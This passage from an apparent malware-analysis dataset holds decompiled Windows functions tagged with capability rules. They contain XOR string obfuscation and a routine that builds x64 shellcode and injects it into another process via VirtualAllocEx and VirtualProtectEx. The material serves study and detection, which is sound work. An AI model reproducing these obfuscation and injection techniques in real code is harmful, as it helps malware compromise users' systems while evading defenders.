(*pcVar13)(uVar6);\n                    uVar6 = (*pcVar9)(0, lpModuleName);\n                    (*pcVar13)(uVar6);\n                    goto code_r0x0040b86f;\n                }\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n            }\n            uVar6 = (*pcVar9)(0, var_14h);\n            pcVar13 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            uVar6 = (*pcVar9)(0, var_ch);\n            (*pcVar13)(uVar6);\n            uVar6 = (*pcVar9)(0, lpModuleName);\n        }\n        (*pcVar13)(uVar6);\n    }\n    else {\ncode_r0x0040b86f:\n        puVar12 = 0x427a40;\n        for (iVar10 = 0x18; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *var_20h = *puVar12;\n            puVar12 = puVar12 + 1;\n            var_20h = var_20h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2512
    },
    "0040b885": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b885(uchar *param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint uVar8;\n    uint *puVar9;\n    code *pcVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    code *pcVar14;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3bh;\n    ushort var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_20h = param_1;\n    if ((((*0x427a28 | *0x427a2c) == 0) || ((*0x427a30 | *0x427a34) == 0)) || ((*0x427a38 | *0x427a3c) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x41d123d;\n        var_30h = 0xa37601c;\n        var_2ch._0_2_ = 0x6815;\n        var_28h = 0x68796653;\n        var_24h._0_2_ = 0x4e70;\n        var_10h = param_2;\n        fcn.0040826e(param_1);\n        iVar11 = 0;\n        do {\n            fcn.004034cf(iVar11, *(&var_28h + iVar11 % 6) ^ *(&var_34h + iVar11));\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 10);\n        var_34h = 0x7c235620;\n        var_30h = 0x7608332b;\n        var_2ch._0_2_ = 0x5c3d;\n        var_2ch._2_1_ = 0x44;\n        var_28h = 0x3051326c;\n        var_24h._0_2_ = 0x5244;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        var_14h = NULL;\n        *puVar7 = 0;\n        puVar7[1] = 0;\n        puVar7[2] = 0;\n        var_18h = &var_34h - puVar7;\n        var_ch = puVar7;\n        do {\n            puVar9 = var_14h;\n            pcVar1 = var_14h + puVar7;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_28h + puVar9 % 6);\n            uVar3 = pcVar1[var_18h];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar6 = var_8h;\n            var_14h = var_14h + 1;\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        } while (var_14h < 0xb);\n        *0x427a28 = fcn.0040f0a7(puVar7);\n        if (*0x427a28 == 0) {\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar14 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar6);\n        }\n        else {\n            var_4ch._0_2_ = 0x3d03;\n            var_4ch._2_1_ = 1;\n            stack0xffffffb3 = 0x93b550f;\n            stack0xffffffb7 = 0x2a532701;\n            var_44h._3_1_ = 0x3d;\n            var_40h._0_1_ = 6;\n            var_40h._1_2_ = 0x553a;\n            stack0xffffffbf = 0x3d0e;\n            var_3bh._0_2_ = 0x3a17;\n            var_3bh._2_2_ = 0x3c55;\n            var_37h = 0x732a;\n            var_28h = 0x4873594f;\n            var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x30);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            puVar7 = puVar9;\n            for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_18h = 0;\n            var_1ch = &var_4ch - puVar9;\n            var_14h = puVar9;\n            do {\n                iVar11 = var_18h;\n                pcVar1 = var_18h + puVar9;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_28h + iVar11 % 5);\n                uVar3 = pcVar1[var_1ch];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar6 = var_8h;\n                var_18h = var_18h + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (var_18h < 0x17);\n            *0x427a30 = fcn.0040f0a7(puVar9);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x427a30 != 0) {\n                var_4ch._0_2_ = 0x1c03;\n                var_4ch._2_1_ = 5;\n                stack0xffffffb3 = 0xe2d2614;\n                stack0xffffffb7 = 0x301f1236;\n                var_44h._3_1_ = 0x19;\n                var_40h._0_1_ = 0x21;\n                var_40h._1_2_ = 0x2813;\n                stack0xffffffbf = 0x2635;\n                var_3bh._0_2_ = 0xb30;\n                var_3bh._2_2_ = 0x2b26;\n                var_37h = 0x5512;\n                var_28h = 0x66556b59;\n                var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x49);\n                fcn.0040cbe3(puVar9);\n                iVar11 = var_1ch;\n                iVar12 = 0;\n                var_1ch = &var_4ch - var_1ch;\n                do {\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_28h + iVar12 % 5);\n                    uVar3 = *(var_1ch + iVar12 + iVar11);\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(iVar12 + iVar11) = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 0x17);\n                *0x427a38 = fcn.0040f0a7(iVar11);\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (*0x427a38 != 0) {\n                    var_4h = 0;\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                    uVar6 = (*pcVar10)(0, var_14h);\n                    pcVar14 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                    uVar6 = (*pcVar10)(0, var_ch);\n                    (*pcVar14)(uVar6);\n                    uVar6 = (*pcVar10)(0, var_8h);\n                    (*pcVar14)(uVar6);\n                    goto code_r0x0040bbac;\n                }\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                uVar6 = var_8h;\n            }\n            uVar8 = (*pcVar10)(0, var_14h);\n            pcVar14 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar8 = (*pcVar10)(0, var_ch);\n            (*pcVar14)(uVar8);\n            uVar6 = (*pcVar10)(0, uVar6);\n        }\n        (*pcVar14)(uVar6);\n    }\n    else {\ncode_r0x0040bbac:\n        puVar13 = 0x427a28;\n        for (iVar11 = 0x18; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *var_20h = *puVar13;\n            puVar13 = puVar13 + 1;\n            var_20h = var_20h + 1;\n        }\n    }\n    *0x427a3c = *0x427a38 >> 0x20;\n    *0x427a34 = *0x427a30 >> 0x20;\n    *0x427a2c = *0x427a28 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2455
    },
    "0040bbc2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040bbc2(uint32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    char cVar9;\n    char cVar10;\n    uint uVar11;\n    uint *puVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    int32_t iVar15;\n    uint *in_ECX;\n    uint32_t in_EDX;\n    int32_t noname_13;\n    int32_t iVar16;\n    int64_t iVar17;\n    ulong uVar18;\n    ulong uVar19;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint noname_19;\n    uint arg_10h_00;\n    uint arg_14h;\n    uint *arg_8h_00;\n    uint arg_20h;\n    uint var_31ch;\n    uint var_314h;\n    uint var_214h;\n    uint var_210h;\n    uchar var_20ch;\n    uint var_20bh;\n    char var_204h;\n    uint var_202h;\n    uint var_188h;\n    uint var_184h;\n    uint32_t var_180h;\n    uint var_17ch;\n    int32_t var_178h;\n    uint32_t var_174h;\n    uint32_t var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_152h;\n    uint var_14eh;\n    uint var_14ah;\n    uint var_146h;\n    uint var_142h;\n    uint var_13eh;\n    uint var_13ah;\n    uint var_136h;\n    uint var_132h;\n    uint var_12eh;\n    uint var_12ah;\n    uint var_126h;\n    uint var_122h;\n    uint32_t var_11eh;\n    uint32_t var_11ah;\n    uint var_116h;\n    uint32_t var_112h;\n    uint var_10eh;\n    uint var_10ah;\n    uint var_106h;\n    uint var_102h;\n    uint var_feh;\n    uint var_fah;\n    uint var_f6h;\n    uint var_f2h;\n    uint32_t var_eeh;\n    uint var_eah;\n    uint32_t var_e6h;\n    uint var_e2h;\n    uint var_deh;\n    uint var_dah;\n    uint var_d6h;\n    uint var_d2h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t *var_70h;\n    uint var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint32_t lpAddress;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint lpflOldProtect;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    \n    _var_74h = CONCAT44(in_ECX, var_74h);\n    var_17ch = 0;\n    lpflOldProtect = 0;\n    *arg_10h = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    var_68h = in_EDX;\n    if (((arg_ch & 0x10) == 0) && ((*0x4279e4 & 1) != 0)) {\n        var_64h = 0x41d123d;\n        var_60h = 0xa37601c;\n        var_5ch._0_2_ = 0x6815;\n        var_ch = 0x68796653;\n        var_8h._0_2_ = 0x4e70;\n        fcn.0040826e(0);\n        iVar16 = 0;\n        do {\n            fcn.004034cf(iVar16, *(&fcn.0040bbc2::var_ch + iVar16 % 6) ^ *(&fcn.0040bbc2::var_64h + iVar16));\n            iVar16 = iVar16 + 1;\n        } while (iVar16 < 10);\n        var_38h._0_2_ = 0x1327;\n        var_38h._2_1_ = 0x1c;\n        stack0xffffffc7 = 0x1421240a;\n        var_34h._3_1_ = 0x13;\n        var_30h._0_2_ = 0x1c15;\n        var_30h._2_1_ = 0x25;\n        var_30h._3_1_ = 0x21;\n        var_2ch._0_2_ = 0x3307;\n        var_2ch._2_1_ = 0x18;\n        var_2ch._3_1_ = 0x3b;\n        var_28h._0_1_ = 0x33;\n        var_28h._1_1_ = 0x25;\n        var_28h._2_1_ = 0x11;\n        stack0xffffffd7 = stack0xffffffd7 & 0xffffff00 | 0x67;\n        var_ch = 0x49706775;\n        var_8h._0_2_ = 0x4456;\n        fcn.0040cc0a(6);\n        puVar12 = var_10h;\n        var_20h = &fcn.0040bbc2::var_38h - var_10h;\n        arg_ch = 0;\n        do {\n            pcVar1 = arg_ch + puVar12;\n            cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&fcn.0040bbc2::var_ch + arg_ch % 6);\n            uVar3 = pcVar1[var_20h];\n            cVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            arg_ch = arg_ch + 1;\n            *pcVar1 = cVar10 + ((uVar2 ^ uVar3) - cVar9);\n        } while (arg_ch < 0x14);\n        fcn.0040eb55();\n        arg_20h = 8;\n        var_44h = 0x350f4119;\n        var_40h._0_2_ = 0x3e26;\n        var_40h._2_1_ = 0x26;\n        var_40h._3_1_ = 0x36;\n        var_1ch = 0x594c3643;\n        var_18h._0_2_ = 0x4d49;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n        puVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        arg_ch = 0;\n        *puVar12 = 0;\n        puVar12[1] = 0;\n        *(puVar12 + 2) = 0;\n        var_20h = &fcn.0040bbc2::var_44h - puVar12;\n        var_ch = puVar12;\n        do {\n            pcVar1 = arg_ch + puVar12;\n            cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&fcn.0040bbc2::var_1ch + arg_ch % 6);\n            uVar3 = pcVar1[var_20h];\n            cVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            arg_ch = arg_ch + 1;\n            *pcVar1 = cVar10 + ((uVar2 ^ uVar3) - cVar9);\n        } while (arg_ch < 8);\n        iVar17 = fcn.0040f0a7(puVar12);\n        var_38h._0_2_ = 0x1c03;\n        var_38h._2_1_ = 5;\n        stack0xffffffc7 = 0xe2d2614;\n        var_34h._3_1_ = 0x36;\n        var_30h._0_2_ = 0x1f12;\n        var_30h._2_1_ = 0x30;\n        var_30h._3_1_ = 0x19;\n        var_2ch._0_2_ = 0x1321;\n        var_2ch._2_1_ = '(';\n        var_2ch._3_1_ = '5';\n        var_28h._0_1_ = '&';\n        var_28h._1_1_ = '0';\n        var_48h = 0xb;\n        var_28h._2_1_ = 0xb;\n        stack0xffffffd7 = 0x55122b26;\n        var_1ch = 0x66556b59;\n        var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x49);\n        fcn.0040cbe3();\n        iVar16 = var_20h;\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_20h = &fcn.0040bbc2::var_38h - var_20h;\n        arg_ch = 0;\n        do {\n            cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_50h = iVar17 >> 0x20;\n            var_180h = iVar17;\n            uVar2 = *(&fcn.0040bbc2::var_1ch + arg_ch % 5);\n            uVar3 = *(var_20h + arg_ch + iVar16);\n            cVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            puVar12 = var_10h;\n            var_50h = iVar17 >> 0x20;\n            var_180h = iVar17;\n            *(arg_ch + iVar16) = cVar10 + ((uVar2 ^ uVar3) - cVar9);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < 0x17);\n        uVar18 = fcn.0040f0a7(iVar16);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        uVar19 = fcn.0040f0a7(puVar12);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        uVar7 = var_180h;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        _var_214h = CONCAT44(var_210h, var_214h);\n        _var_64h = CONCAT44(var_60h, var_64h);\n        if (iVar17 != 0) {\n            var_20ch = 0;\n            sub.ntdll.dll_memset(&fcn.0040bbc2::var_20bh, 0, 0x7f);\n            var_50h = iVar17 >> 0x20;\n            var_180h = iVar17;\n            var_188h = uVar18 >> 0x20;\n            var_20h = uVar18;\n            var_1ch = uVar19 >> 0x20;\n            var_178h = uVar19;\n            var_40h._0_2_ = iVar17 >> 0x20;\n            var_40h._2_1_ = iVar17 >> 0x30;\n            var_40h._3_1_ = iVar17 >> 0x38;\n            var_44h = uVar7;\n            iVar13 = fcn.0040e34b(&stack0xfffffdf0, 0x80);\n            pcVar4 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n            var_50h = iVar17 >> 0x20;\n            var_180h = iVar17;\n            var_188h = uVar18 >> 0x20;\n            var_20h = uVar18;\n            var_1ch = uVar19 >> 0x20;\n            var_178h = uVar19;\n            _var_214h = CONCAT44(var_210h, var_214h);\n            _var_64h = CONCAT44(var_60h, var_64h);\n            if (iVar13 != 0) {\n                if (var_202h == -0x3d) {\n                    puVar14 = 0xb;\n                }\n                else {\n                    puVar14 = NULL;\n                    var_48h = NULL;\n                    if (var_204h == -10) {\n                        puVar14 = 0x10;\n                        var_48h = 0x10;\n                    }\n                }\n                _var_214h = CONCAT44(var_210h, var_214h);\n                _var_64h = CONCAT44(var_60h, var_64h);\n                if (puVar14 != NULL) {\n                    var_44h = 0x442524ff;\n                    var_40h._0_2_ = 0x2233;\n                    var_40h._2_1_ = 0x11;\n                    var_30h._0_2_ = 0xb848;\n                    var_30h._2_1_ = 0x11;\n                    var_30h._3_1_ = 0x22;\n                    var_2ch._0_2_ = 0x4433;\n                    var_2ch._2_1_ = 'U';\n                    var_2ch._3_1_ = 'f';\n                    var_28h._0_1_ = 'w';\n                    var_28h._1_1_ = -0x78;\n                    var_28h._2_1_ = 0xff;\n                    stack0xffffffd7 = stack0xffffffd7 & 0xffffff00 | 0xe0;\n                    var_174h = 0x44c0c748;\n                    var_170h = 0x83334433;\n                    var_16ch = 0x840f0138;\n                    var_168h = 0xb4;\n                    var_164h = 0x100c7;\n                    var_160h = 0x89480000;\n                    var_15ch = 0x89480848;\n                    var_158h._0_1_ = 0x50;\n                    var_158h._1_1_ = 0x10;\n                    stack0xfffffea6 = 0x18788948;\n                    var_152h = 0x20708948;\n                    var_14eh = 0x2840894c;\n                    var_14ah = 0x3048894c;\n                    var_146h = 0x3850894c;\n                    var_142h = 0x4058894c;\n                    var_13eh = 0x48588948;\n                    var_13ah = 0x50688948;\n                    var_136h = 0x58ec8348;\n                    var_132h = 0x2444c748;\n                    var_12eh = 0x48;\n                    var_12ah = 0x44c74800;\n                    var_126h = 0x4024;\n                    var_122h = 0xc7480000;\n                    var_11eh = 0x382444;\n                    var_11ah = 0x48000000;\n                    var_116h = 0x302444c7;\n                    var_112h = 0;\n                    var_10eh = 0x2444c748;\n                    var_10ah = 0x28;\n                    var_106h = 0x44c74800;\n                    var_102h = 0x2024;\n                    var_feh = 0x314d0000;\n                    var_fah = 0xc0314dc9;\n                    var_f6h = 0x48d23148;\n                    var_f2h = 0x48ffc983;\n                    var_eeh = 0x667788b8;\n                    var_eah = 0x22334455;\n                    var_e6h = 0x48d0ff11;\n                    var_e2h = 0x4858c483;\n                    var_deh._0_2_ = 0xc0c7;\n                    var_deh._2_2_ = 0x3344;\n                    var_dah._0_2_ = 0x3344;\n                    var_dah._2_2_ = 0x8b48;\n                    var_d6h = 0x8b480848;\n                    var_d2h._0_1_ = 0x50;\n                    stack0xffffff2c = 0x18788b48;\n                    var_cch = 0x20708b48;\n                    var_c8h = 0x28408b4c;\n                    var_c4h = 0x30488b4c;\n                    var_c0h = 0x38508b4c;\n                    var_bch = 0x40588b4c;\n                    var_b8h = 0x48588b48;\n                    var_b4h = 0x50688b48;\n                    var_b0h._0_1_ = 0x90;\n                    var_d2h._1_1_ = var_158h._1_1_;\n                    iVar13 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*var_70h, 0, 0x200, 0x3000, 0x20);\n                    var_50h = iVar17 >> 0x20;\n                    var_180h = iVar17;\n                    var_188h = uVar18 >> 0x20;\n                    var_20h = uVar18;\n                    var_1ch = uVar19 >> 0x20;\n                    var_178h = uVar19;\n                    var_10h = (*pcVar4)(*var_70h, 0, 0x110, 0x3000, 4);\n                    var_50h = iVar17 >> 0x20;\n                    var_180h = iVar17;\n                    var_188h = uVar18 >> 0x20;\n                    var_20h = uVar18;\n                    var_1ch = uVar19 >> 0x20;\n                    var_178h = uVar19;\n                    lpAddress = (*pcVar4)(*var_70h, 0, 0xc, 0x3000, 0x20);\n                    var_50h = iVar17 >> 0x20;\n                    var_180h = iVar17;\n                    var_188h = uVar18 >> 0x20;\n                    var_20h = uVar18;\n                    var_1ch = uVar19 >> 0x20;\n                    var_178h = uVar19;\n                    piVar8 = var_70h;\n                    if (lpAddress != 0) {\n                        iVar15 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                           (*var_70h, lpAddress, 0xc, 0x40, &fcn.0040bbc2::lpflOldProtect);\n                        var_50h = iVar17 >> 0x20;\n                        var_180h = iVar17;\n                        var_188h = uVar18 >> 0x20;\n                        var_20h = uVar18;\n                        var_1ch = uVar19 >> 0x20;\n                        var_178h = uVar19;\n                        if (iVar15 != 0) {\n                            var_30h._2_1_ = var_68h;\n                            var_30h._3_1_ = var_68h >> 8;\n                            var_2ch._0_2_ = var_68h >> 0x10;\n                            var_28h._1_1_ = var_68h >> 0x18;\n                            var_2ch._2_1_ = var_28h._1_1_ >> 7;\n                            var_2ch._3_1_ = var_28h._1_1_ >> 0xf;\n                            var_28h._0_1_ = var_28h._1_1_ >> 0x17;\n                            var_28h._1_1_ = var_28h._1_1_ >> 0x1f;\n                            iVar15 = fcn.0040cb6a(&fcn.0040bbc2::var_30h, 0xc);\n                            var_50h = iVar17 >> 0x20;\n                            var_180h = iVar17;\n                            var_188h = uVar18 >> 0x20;\n                            var_20h = uVar18;\n                            var_1ch = uVar19 >> 0x20;\n                            var_178h = uVar19;\n                            if (iVar15 != 0) {\n                                var_68h = lpAddress;\n                            }\n                            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                      (*var_70h, lpAddress, 0xc, lpflOldProtect, &fcn.0040bbc2::lpflOldProtect);\n                            var_50h = iVar17 >> 0x20;\n                            var_180h = iVar17;\n                            var_188h = uVar18 >> 0x20;\n                            var_20h = uVar18;\n                            var_1ch = uVar19 >> 0x20;\n                            var_178h = uVar19;\n                        }\n                    }\n                    _var_214h = CONCAT44(var_210h, var_214h);\n                    _var_64h = CONCAT44(var_60h, var_64h);\n                    if ((iVar13 != 0) &&\n                       (_var_214h = CONCAT44(var_210h, var_214h),  _var_64h = CONCAT44(var_60h, var_64h), \n                       var_10h != NULL)) {\n                        noname_16 = 0x40c197;\n                        iVar15 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                           (*var_70h, iVar13, 0x200, 0x40, &fcn.0040bbc2::lpflOldProtect);\n                        var_50h = iVar17 >> 0x20;\n                        var_180h = iVar17;\n                        var_188h = uVar18 >> 0x20;\n                        var_20h = uVar18;\n                        var_178h = uVar19;\n                        if (iVar15 != 0) {\n                            var_174h = var_174h & 0xffffff | var_10h << 0x18;\n                            var_170h = var_170h & 0xff000000 | var_10h >> 8;\n                            var_deh._2_2_ = SUB42(var_10h, 0);\n                            var_dah._0_2_ = var_10h >> 0x10;\n                            var_11eh = var_11eh & 0xffffff | arg_8h << 0x18;\n                            var_11ah = var_11ah & 0xff000000 | arg_8h >> 8;\n                            var_112h = var_68h;\n                            var_eeh = var_eeh & 0xff | var_178h << 8;\n                            var_eah = uVar19 >> 0x18;\n                            var_e6h = var_e6h & 0xffffff00 | uVar19 >> 0x38;\n                            arg_10h_00 = 0;\n                            _var_31ch = 0;\n                            noname_18 = 0x40c1f3;\n                            sub.ntdll.dll_memset(&fcn.0040bbc2::var_314h, 0, 0x108);\n                            var_50h = iVar17 >> 0x20;\n                            var_180h = iVar17;\n                            var_188h = uVar18 >> 0x20;\n                            var_20h = uVar18;\n                            var_1ch = uVar19 >> 0x20;\n                            var_178h = uVar19;\n                            _var_214h = iVar17 + -0x4c;\n                            puVar14 = var_10h + 0x42;\n                            var_44h = var_44h & 0xffffff | puVar14 * 0x1000000;\n                            var_40h._0_2_ = puVar14 >> 8;\n                            var_40h._2_1_ = puVar14 >> 0x18;\n                            arg_14h = 0x110;\n                            iVar15 = fcn.0040cb6a(&fcn.0040bbc2::var_31ch, 0x110);\n                            var_50h = iVar17 >> 0x20;\n                            var_180h = iVar17;\n                            var_188h = uVar18 >> 0x20;\n                            var_20h = uVar18;\n                            var_1ch = uVar19 >> 0x20;\n                            var_178h = uVar19;\n                            if (iVar15 != 0) {\n                                noname_19 = 0xc5;\n                                iVar15 = fcn.0040cb6a(&fcn.0040bbc2::var_174h, 0xc5);\n                                var_50h = iVar17 >> 0x20;\n                                var_180h = iVar17;\n                                var_188h = uVar18 >> 0x20;\n                                var_20h = uVar18;\n                                var_1ch = uVar19 >> 0x20;\n                                var_178h = uVar19;\n                                if (iVar15 != 0) {\n                                    puVar14 = var_48h;\n                                    iVar15 = fcn.0040cb6a(&stack0xfffffdf0, var_48h);\n                                    var_50h = iVar17 >> 0x20;\n                                    var_180h = iVar17;\n                                    var_188h = uVar18 >> 0x20;\n                                    var_20h = uVar18;\n                                    var_1ch = uVar19 >> 0x20;\n                                    var_178h = uVar19;\n                                    if (iVar15 != 0) {\n                                        arg_8h_00 = &fcn.0040bbc2::var_44h;\n                                        noname_15 = 7;\n                                        iVar15 = fcn.0040cb6a(arg_8h_00, 7);\n                                        var_50h = iVar17 >> 0x20;\n                                        var_180h = iVar17;\n                                        var_188h = uVar18 >> 0x20;\n                                        var_20h = uVar18;\n                                        var_1ch = uVar19 >> 0x20;\n                                        var_178h = uVar19;\n                                        if (iVar15 != 0) {\n                                            var_30h._2_1_ = iVar13;\n                                            var_30h._3_1_ = iVar13 >> 8;\n                                            var_2ch._0_2_ = iVar13 >> 0x10;\n                                            var_1ch = &fcn.0040bbc2::var_74h;\n                                            var_28h._1_1_ = iVar13 >> 0x18;\n                                            var_2ch._2_1_ = var_28h._1_1_ >> 7;\n                                            var_2ch._3_1_ = var_28h._1_1_ >> 0xf;\n                                            var_28h._0_1_ = var_28h._1_1_ >> 0x17;\n                                            var_28h._1_1_ = var_28h._1_1_ >> 0x1f;\n                                            noname_13 = var_1ch >> 0x1f;\n                                            var_68h = 0;\n                                            var_10h = &fcn.0040bbc2::var_6ch;\n                                            lpAddress = var_10h >> 0x1f;\n                                            var_48h = &fcn.0040bbc2::var_64h;\n                                            var_178h = var_48h >> 0x1f;\n                                            var_6ch = 0xc;\n                                            _var_74h = 0;\n                                            _var_64h = iVar17;\n                                            iVar15 = fcn.0040ab21(var_20h, var_188h, 5, 0, *var_70h, *var_70h >> 0x1f, \n                                                                  var_48h, var_178h, var_10h, lpAddress, 0x40, 0, \n                                                                  var_1ch, noname_13, arg_8h_00, noname_15, noname_16, \n                                                                  puVar14, noname_18, noname_19, arg_10h_00, arg_14h, \n                                                                  arg_8h_00, uVar11, arg_20h);\n                                            var_50h = iVar17 >> 0x20;\n                                            var_180h = iVar17;\n                                            var_188h = uVar18 >> 0x20;\n                                            var_20h = uVar18;\n                                            if (-1 < iVar15) {\n                                                _var_184h = iVar17;\n                                                iVar15 = fcn.0040e4f3(&fcn.0040bbc2::var_30h);\n                                                iVar17 = CONCAT44(var_50h, var_180h);\n                                                var_188h = uVar18 >> 0x20;\n                                                var_20h = uVar18;\n                                                if (iVar15 != 0) {\n                                                    iVar15 = *var_70h;\n                                                    fcn.0040ab21(var_20h, var_188h, 5, 0, iVar15, iVar15 >> 0x1f, \n                                                                 var_48h, var_178h, var_10h, lpAddress, var_74h, var_70h\n                                                                 , var_1ch, noname_13, arg_8h_00, noname_15, noname_16, \n                                                                 puVar14, noname_18, noname_19, arg_10h_00, arg_14h, \n                                                                 arg_8h_00, uVar11, arg_20h);\n                                                    iVar17 = CONCAT44(var_50h, var_180h);\n                                                    var_188h = uVar18 >> 0x20;\n                                                    var_20h = uVar18;\n                                                    var_17ch = 1;\n                                                    *arg_10h = iVar13;\n                                                }\n                                            }\n                                            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                                      (*piVar8, iVar13, 0x200, 0x20, &fcn.0040bbc2::lpflOldProtect);\n                                            var_50h = iVar17 >> 0x20;\n                                            var_180h = iVar17;\n                                            var_188h = uVar18 >> 0x20;\n                                            var_20h = uVar18;\n                                            uVar19 = CONCAT44(var_1ch, var_178h);\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar16);\n        pcVar6 = 